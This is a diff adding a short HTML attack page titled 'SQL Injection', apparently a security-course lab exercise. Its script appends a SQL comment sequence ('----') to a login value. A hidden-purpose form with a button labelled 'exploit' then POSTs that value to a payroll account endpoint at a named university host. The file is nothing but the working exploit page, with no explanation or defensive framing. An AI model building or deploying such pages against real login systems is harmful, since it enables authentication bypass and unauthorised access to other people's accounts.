@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+   <head>
+	<meta charset="UTF-8" />
+	<title>SQL Injection</title>
+	<script>
+	function myFunction(){
+		var value = document.myform.login.value;
+		document.myform.login.value = value + "----";
+		return true;
+	}
+	</script>
+   </head>
+   <body>
+	<form name = "myform" action= "http://payroll.gatech.edu/account.php" onsubmit="myFunction()" method = "POST">
+		<input name = "login" id= "targetlogin" value = "username" />
+		<button id= "exploit" > Submit</button>
+	</form>
+
+
+   </body>
+</html>
